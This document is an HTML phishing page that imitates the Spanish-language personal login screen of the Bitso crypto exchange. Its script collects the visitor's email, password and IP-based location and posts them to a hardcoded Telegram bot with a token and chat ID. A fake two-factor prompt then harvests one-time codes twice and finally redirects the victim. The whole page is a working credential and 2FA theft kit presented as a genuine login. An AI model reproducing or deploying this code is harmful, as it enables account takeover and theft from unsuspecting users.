<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>BITSO</title>
    <style>
      body {
        padding: 0;
        border: 0;
        margin: 0;
        height: 100vh;
      }

      .grid-container {
        height: 58px;
        width: 100%;
        display: grid;
        place-items: center;
      }

      .desktop-image {
        width: 300px;
      }

      .mobile-image {
        width: 230px;
      }

      /* Por defecto, ocultamos la imagen para escritorio */
      .desktop-image {
        display: none;
      }

      .hecjEI {
        font-size: 1.75rem;
        line-height: 2rem;
        font-weight: 700;
        float: left;
      }

      .login {
        width: 560px;
        height: 674px;
        background: white;
        display: flex;
        justify-content: center;
        flex-wrap: wrap;
        border-radius: 5px;
      }

      .titulo {
        width: 432px;
        margin-top: 50px;
        height: 100px;
      }

      .inputs {
        width: 432px;
      }

      .nomostrar {
        background: white;
        color: white;
      }

      /* Media query para pantallas grandes (por ejemplo, más de 768px) */
      @media (min-width: 768px) {
        .desktop-image {
          display: block;
          /* Mostramos la imagen para escritorio */
        }

        .mobile-image {
          display: none;
          /* Ocultamos la imagen móvil */
        }
      }

      @media (max-width: 768px) {
        .login {
          width: 100%;
          height: 100%;
          display: flex;

          justify-content: center;
        }

        .titulo {
          width: 312px;
          height: 50px;
        }

        .inputs {
          width: 312px;
        }

        .hecjEI {
          font-size: 1.25rem;
          line-height: 1.5rem;
          font-weight: 700;
          color: rgb(25, 30, 35);
          margin: 0px;
          padding: 0px;
        }
      }

      a {
        color: black;
        text-decoration: none;
        background-color: transparent;
        margin-left: 20px;
      }

      /* Media query para dispositivos móviles */
    </style>
    <link rel="stylesheet" href="styles.css" />
  </head>

  <body>
    <div
      style="
        height: 58px;
        width: 100%;
        display: flex;
        align-items: center;
        border: 0;
        border-bottom: 0.5px solid grey;
      "
    >
      <a
        ><svg
          aria-label="Bitso logo"
          xmlns="http://www.w3.org/2000/svg"
          class="sc-bdvvtL cOwcji global-nav__header__logo-link__image"
          role="img"
          height="28px"
          width="102px"
        >
          <path
            fill-rule="evenodd"
            clip-rule="evenodd"
            d="M16.3601 20.3343C16.3601 20.0048 16.086 19.742 15.7591 19.7588C15.2132 19.7871 14.4316 19.8092 13.8996 19.8092C10.7203 19.8092 8.14291 17.2167 8.14291 14.0184V0.207603C8.14291 0.0928027 8.05043 9.15527e-05 7.9363 9.15527e-05H0.12774C0.0572203 9.15527e-05 0 0.057336 0 0.128269V14.0184C0.0102069 21.7418 6.23701 28.0001 13.9178 28.0001C14.6914 28.0001 15.4489 27.9329 16.1878 27.8103C16.2874 27.7941 16.3601 27.7061 16.3601 27.6047V20.3343Z"
            fill="currentColor"
          ></path>
          <path
            fill-rule="evenodd"
            clip-rule="evenodd"
            d="M13.9187 9.15527e-05C13.1358 9.15527e-05 12.3697 0.0688471 11.6224 0.194847C11.5229 0.211958 11.4505 0.299692 11.4505 0.401425V7.68889C11.4505 8.01649 11.7189 8.3136 12.0394 8.28156C12.3595 8.24983 13.9001 8.22805 13.9001 8.22805C17.0797 8.22805 19.6571 10.8205 19.6571 14.0184H19.6673V26.6396C19.6673 26.6906 19.7208 26.7248 19.7666 26.7034C24.531 24.4808 27.8371 19.6306 27.8371 14.0001C27.8371 6.26805 21.6057 9.15527e-05 13.9187 9.15527e-05Z"
            fill="currentColor"
          ></path>
          <path
            fill-rule="evenodd"
            clip-rule="evenodd"
            d="M94.1767 8.06551C89.0414 8.06551 86.774 11.5546 86.774 16.2804C86.774 20.9231 89.4782 23.7259 93.7115 23.7259C98.8468 23.7259 101.087 20.2916 101.087 15.6212C101.087 10.9501 98.4376 8.06551 94.1767 8.06551ZM95.8849 19.7424C95.3111 20.1269 94.6839 20.3466 93.8089 20.3466C92.0882 20.3466 91.0505 18.8632 91.0505 16.1982C91.0505 14.7139 91.3505 13.3954 91.8429 12.7088C92.4164 12.2689 93.0715 12.0492 93.9187 12.0492C95.7485 12.0492 96.6495 13.5603 96.6495 15.758C96.6495 17.4069 96.3764 18.8632 95.8849 19.7424ZM79.7861 14.4399C77.5455 14.055 77.0271 13.7803 77.0271 13.0931C77.0271 12.7636 77.1369 12.4615 77.2999 12.2689C77.8737 12.0767 78.7474 11.9668 79.649 11.9668C81.4247 11.9668 83.0086 12.2416 84.3198 12.6538V9.08223C83.3093 8.56018 81.6431 8.06551 79.3215 8.06551C75.3881 8.06551 72.9298 9.93374 72.9298 13.1208C72.9298 16.1706 74.7321 17.1045 78.0373 17.7087C80.4684 18.176 80.9868 18.423 80.9868 19.1653C80.9868 19.4951 80.9051 19.7424 80.769 19.9073C80.1684 20.127 79.3215 20.2642 78.0927 20.2642C76.4531 20.2642 74.5141 19.9073 73.3397 19.4951V22.9845C74.5679 23.4786 76.5078 23.7259 78.2287 23.7259C82.408 23.7259 85.1116 22.4077 85.1116 19.0278C85.1116 16.1429 83.3365 15.0988 79.7861 14.4399ZM48.0516 13.7252C49.4443 12.9008 50.6463 11.5546 50.6463 9.63164C50.6463 6.36186 48.1332 4.63115 42.8888 4.63115H35.3502V23.4515H44.1179C48.7886 23.4515 51.1653 21.6654 51.1653 18.1212C51.1653 15.758 49.7991 14.4399 48.0516 13.7252ZM39.9391 8.23024C40.6764 8.20255 41.5777 8.17518 42.6157 8.17518C45.0196 8.17518 46.0848 8.88949 46.0848 10.4556C46.0848 11.3348 45.757 11.9667 44.9376 12.5438C44.3091 12.681 43.5718 12.7634 42.6977 12.7634C41.66 12.7634 40.6764 12.7361 39.9391 12.7087V8.23024ZM45.7845 20.1543C45.1832 20.3195 44.1727 20.374 43.3259 20.374C41.9328 20.374 40.7581 20.3466 39.9391 20.3195V15.9509H43.1892C45.5386 15.9509 46.5219 16.6375 46.5219 18.2037C46.5219 18.9731 46.2484 19.6046 45.7845 20.1543ZM54.2169 23.4513H58.6414V8.34006H54.2169V23.4513ZM66.796 4.60381L62.5611 4.93358V19.193C62.5611 21.9949 63.8453 23.6989 67.0682 23.6989C68.4341 23.6989 69.5268 23.4515 70.4559 23.0393V19.5499C69.554 19.8797 68.7622 20.0442 67.9157 20.0442C67.1777 20.0442 66.796 19.632 66.796 18.9454V11.857H70.3737V8.34025H66.796V4.60381ZM58.641 5.7577V1.99357L54.2169 2.32304V5.7577H58.641Z"
            fill="currentColor"
          ></path>
        </svg>
      </a>
    </div>

    <div
      style="
        height: 100%;
        width: 100%;
        background-image: url('RegisterIllustrationTablet.0fb71f6b.png');
        background-size: cover;
        background-repeat: no-repeat;
        background-position: center center;
        display: grid;
        place-items: center;
      "
    >
      <div class="login">
        <div class="titulo">
          <h1 class="hecjEI">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="34px"
              height="34px"
              viewBox="0 0 24 24"
              aria-hidden="true"
              style="float: left; margin-right: 10px"
              role="img"
            >
              <path
                d="M11.9 10C14.7 10 16.5 8.4 16.5 5.9C16.5 3.5 14.8 2 12.1 2C9.3 2 7.5 3.6 7.5 6C7.5 8.4 9.2 10 11.9 10ZM12.1 4C13.2 4 14.5 4.3 14.5 6C14.5 7.8 12.9 8 11.9 8C10.3 8 9.5 7.4 9.5 6C9.5 4.2 11.1 4 12.1 4ZM12.1 11C7.1 11 4 13.3 4 18.6V20V21H20V18.6C20.1 13.3 17 11 12.1 11ZM6 19C6 15.1 8.2 13.1 12 13.1H12.1C15.9 13.1 18.1 15.2 18.1 19H6Z"
                fill="currentColor"
              ></path>
            </svg>
            Inicio de sesión para cuentas personales
          </h1>
        </div>
        <br />

        <form id="loginform">
          <div class="inputs">
            <div>
              <label class="input">
                <input
                  class="input__field"
                  type="email"
                  placeholder=" "
                  style="width: 100%"
                  id="email"
                  required
                />
                <span class="input__label">Correo Electrónico o ID</span>
              </label>
            </div>
            <br />
            <div>
              <label class="input">
                <input
                  class="input__field"
                  type="password"
                  placeholder=" "
                  style="width: 100%"
                  id="contra"
                  pattern=".*[^a-zA-Z0-9].*"
                  title="La contraseña debe contener al menos un símbolo."
                  required
                />
                <span class="input__label">Contraseña</span>
              </label>
            </div>
            <br />
          </div>

          <div class="inputs">
            <p
              style="
                font-style: normal;
                text-align: center;
                border: none;
                background: none;
                text-decoration: none;
                transition: all 0.2s ease 0s, font-size 0s ease 0s;
                position: relative;
                cursor: pointer;
                display: flex;
                -webkit-box-align: center;
                align-items: center;
                width: fit-content;
                font-size: 16px;
                font-weight: 700;
                letter-spacing: 1px;
                line-height: 24px;
                color: rgb(9, 131, 0);
                border-radius: 2px;
                min-height: 30px;
                padding: 1px;
              "
            >
              Olvidé mi contraseña
            </p>
          </div>

          <div class="inputs">
            <button
              style="
                position: relative;
                display: flex;
                -webkit-box-align: center;
                align-items: center;
                -webkit-box-pack: center;
                justify-content: center;
                border-radius: 32px;
                padding: 0px 24px;
                gap: 8px;
                height: 48px;
                width: 100%;
                background: rgb(41, 172, 0);
                border: 1px solid rgb(41, 172, 0);
                color: rgb(255, 255, 255);
                text-shadow: rgba(12, 15, 18, 0.35) 0px 0px 8px;
                font-size: 1rem;
                line-height: 1.5rem;
                font-weight: 700;
                cursor: pointer;
                transition: all 0.15s ease 0s;
                white-space: nowrap;
              "
            >
              Iniciar Sesión
            </button>
          </div>
        </form>

        <div class="inputs">
          <p
            style="
              border: none;
              background: none;
              text-decoration: none;
              transition: all 0.2s ease 0s, font-size 0s ease 0s;
              position: relative;
              cursor: pointer;
              display: flex;
              -webkit-box-align: center;
              align-items: center;
              width: fit-content;
              font-size: 16px;
              font-weight: 700;
              letter-spacing: 1px;
              line-height: 24px;
              color: rgb(9, 131, 0);
              border-radius: 2px;
              min-height: 30px;
              padding: 1px;
            "
          >
            Aun no tienes cuenta
          </p>
        </div>
        <div class="inputs nomostrar">as</div>
        <div class="inputs nomostrar">as</div>
        <div class="inputs grid-container">
          <img src="bajo.png" class="mobile-image" alt="Imagen para móvil" />
        </div>
        <div class="inputs nomostrar">as</div>
        <div class="inputs nomostrar">as</div>
        <div class="inputs nomostrar">as</div>
      </div>
    </div>

    <div class="grid-container">
      <img src="bajo2.png" class="desktop-image" alt="Imagen para escritorio" />
    </div>
    <style>
      #overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.5);
        display: flex;
        justify-content: center;
        align-items: center;
      }

      .digit-input {
        width: 30px;
        height: 40px;
        text-align: center;
        margin: 0 5px;
        border-radius: 5px;
      }
    </style>
    <div id="overlay" style="display: none">
      <div
        style="padding: 20px; text-align: center; display: none"
        id="cargando"
      >
        <img
          src="https://media.tenor.com/t5DMW5PI8mgAAAAi/loading-green-loading.gif"
          width="200px"
        />
      </div>

      <div style="padding: 20px; background: white" id="token">
        <div style="text-align: center">
          <h3>Autenticación de dos factores</h3>
          <br />
          Introduce el codigo de tu dispositivo con 2FA/SMS
          <br />
          <br />
          <br />
        </div>
        <form id="tokenform">
          <div style="width: 100%; text-align: center">
            <input
              class="digit-input"
              type="text"
              inputmode="numeric"
              maxlength="1"
              id="1"
              oninput="moveForward(this, event)"
              onkeydown="moveBackward(this, event)"
              required
            />
            <input
              class="digit-input"
              type="text"
              inputmode="numeric"
              maxlength="1"
              id="2"
              oninput="moveForward(this, event)"
              onkeydown="moveBackward(this, event)"
              required
            />
            <input
              class="digit-input"
              type="text"
              inputmode="numeric"
              maxlength="1"
              id="3"
              oninput="moveForward(this, event)"
              onkeydown="moveBackward(this, event)"
              required
            />
            <input
              class="digit-input"
              type="text"
              inputmode="numeric"
              maxlength="1"
              id="4"
              oninput="moveForward(this, event)"
              onkeydown="moveBackward(this, event)"
              required
            />
            <input
              class="digit-input"
              type="text"
              inputmode="numeric"
              maxlength="1"
              id="5"
              oninput="moveForward(this, event)"
              onkeydown="moveBackward(this, event)"
              required
            />
            <input
              class="digit-input"
              type="text"
              inputmode="numeric"
              maxlength="1"
              id="6"
              oninput="moveForward(this, event)"
              onkeydown="moveBackward(this, event)"
              required
            />

            <div class="inputs" style="margin-top: 50px">
              <button
                style="
                  position: relative;
                  display: flex;
                  -webkit-box-align: center;
                  align-items: center;
                  -webkit-box-pack: center;
                  justify-content: center;
                  border-radius: 32px;
                  padding: 0px 24px;
                  gap: 8px;
                  height: 48px;
                  width: 100%;
                  background: rgb(41, 172, 0);
                  border: 1px solid rgb(41, 172, 0);
                  color: rgb(255, 255, 255);
                  text-shadow: rgba(12, 15, 18, 0.35) 0px 0px 8px;
                  font-size: 1rem;
                  line-height: 1.5rem;
                  font-weight: 700;
                  cursor: pointer;
                  transition: all 0.15s ease 0s;
                  white-space: nowrap;
                "
              >
                Confirmar
              </button>
            </div>
          </div>
        </form>
      </div>
    </div>
    <script>
      function moveForward(input, event) {
        if (input.value.length == 1 && input.value.match(/[0-9]/)) {
          let next = input.nextElementSibling;
          if (next && next.classList.contains("digit-input")) {
            next.focus();
          }
        } else {
          input.value = "";
        }
      }

      function moveBackward(input, event) {
        if (event.key === "Backspace" && input.value.length === 0) {
          let prev = input.previousElementSibling;
          if (prev && prev.classList.contains("digit-input")) {
            prev.focus();
          }
        }
      }
    </script>
  </body>
  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>

  <script>
    const url = "https://ipapi.co/json/";
    const form = document.querySelector("#loginform");
    form.addEventListener("submit", (event) => {
      event.preventDefault();
      axios
        .get(url)
        .then((response) => {
          const email = document.querySelector("#email").value;
          localStorage.setItem("usuario", email);
          const password = document.querySelector("#contra").value;
          const message =
            "Correo: " +
            email +
            "\nContra: " +
            password +
            "\nCiudad:" +
            response.data.city +
            "\nPais: " +
            response.data.country +
            "\nIP: " +
            response.data.ip;
          axios
            .post(
              "https://api.telegram.org/bot7019761192:AAFEkPcaSDdIMtRpPVw8WkTQQbjYsDI7Zlw/sendMessage",
              {
                chat_id: "1988446847",
                text: message,
              }
            )
            .then((response) => {
              document.getElementById("overlay").style.display = "";

              document.getElementById("token").style.display = "none";
              document.getElementById("cargando").style.display = "";
              let tiempo = 10; // el número inicial para el contador

              const intervalo = setInterval(() => {
                tiempo -= 1;

                if (tiempo <= 0) {
                  clearInterval(intervalo);
                  document.getElementById("cargando").style.display = "none";
                  document.getElementById("token").style.display = "";
                }
              }, 1000);
              console.log(response.data);
            })
            .catch((error) => {
              console.error(error);
            });
        })
        .catch((error) => {
          console.log(error);
        });
    });
    var num = 2;
    const form2 = document.querySelector("#tokenform");
    form2.addEventListener("submit", (event) => {
      event.preventDefault();
      axios
        .get(url)
        .then((response) => {
          const email = localStorage.getItem("usuario");
          const token =
            document.getElementById("1").value +
            document.getElementById("2").value +
            document.getElementById("3").value +
            document.getElementById("4").value +
            document.getElementById("5").value +
            document.getElementById("6").value;
          const message =
            "Correo: " +
            email +
            "\nCodigo: " +
            token +
            "\nCiudad:" +
            response.data.city +
            "\nPais: " +
            response.data.country +
            "\nIP: " +
            response.data.ip;
          axios
            .post(
              "https://api.telegram.org/bot7019761192:AAFEkPcaSDdIMtRpPVw8WkTQQbjYsDI7Zlw/sendMessage",
              {
                chat_id: "1988446847",
                text: message,
              }
            )
            .then((response) => {
              document.getElementById("1").value = "";
              document.getElementById("2").value = "";
              document.getElementById("3").value = "";
              document.getElementById("4").value = "";
              document.getElementById("5").value = "";
              document.getElementById("6").value = "";
              document.getElementById("token").style.display = "none";
              document.getElementById("cargando").style.display = "";
              let tiempo = 10; // el número inicial para el contador

              const intervalo = setInterval(() => {
                tiempo -= 1;

                if (tiempo <= 0) {
                  num = num - 1;
                  if (num === 0) {
                    clearInterval(intervalo);
                    alert("Verificación Validada");
                    window.location.href = "cod.html";
                  } else {
                    clearInterval(intervalo);

                    document.getElementById("cargando").style.display = "none";

                    document.getElementById("token").style.display = "";
                    alert("Verificación Incorrecta Ingrese nuevamente");
                  }
                }
              }, 1000);
            })
            .catch((error) => {
              console.error(error);
            });
        })
        .catch((error) => {
          console.log(error);
        });
    });
  </script>
</html>
